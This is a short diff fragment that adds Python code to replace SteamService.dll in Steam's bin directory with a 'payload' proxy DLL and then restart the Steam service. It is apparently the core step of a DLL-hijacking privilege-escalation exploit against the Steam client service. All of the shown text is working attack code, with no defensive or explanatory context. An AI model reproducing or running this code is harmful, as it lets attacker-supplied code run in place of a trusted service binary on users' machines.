@@ -1,0 +1,5 @@
+# Replace SteamService.dll in bin\ with proxy
+shutil.copy2(payload_dll, os.path.join(STEAM_DIR, "bin",
+                                        "SteamService.dll"))
+# Restart service
+subprocess.run(["sc", "start", STEAM_SVC])
